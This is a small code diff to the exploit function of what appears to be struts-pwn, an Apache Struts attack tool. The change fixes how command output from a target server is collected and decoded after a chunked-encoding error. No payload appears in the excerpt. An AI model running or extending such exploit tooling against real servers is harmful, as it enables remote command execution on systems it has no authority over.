@@ -98,17 +98,19 @@ def exploit(url, cmd):
         print("[!] ChunkedEncodingError Error: Making another request to the url.")
         print("Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.")
         try:
-            output = ""
+            output = b""
             with requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False, stream=True) as resp:
                 for i in resp.iter_content(decode_unicode=True):
-                    output += i.decode('utf-8')
+                    output += i
         except requests.exceptions.ChunkedEncodingError as e:
             print("EXCEPTION::::--> " + str(e))
             print("Note: Server Connection Closed Prematurely\n")
         except Exception as e:
             print("EXCEPTION::::--> " + str(e))
             output = 'ERROR'
-    
+        if type(output) != str:
+            output = output.decode('utf-8')
+        return(output)
     except Exception as e:
         print("EXCEPTION::::--> " + str(e))
         output = 'ERROR'
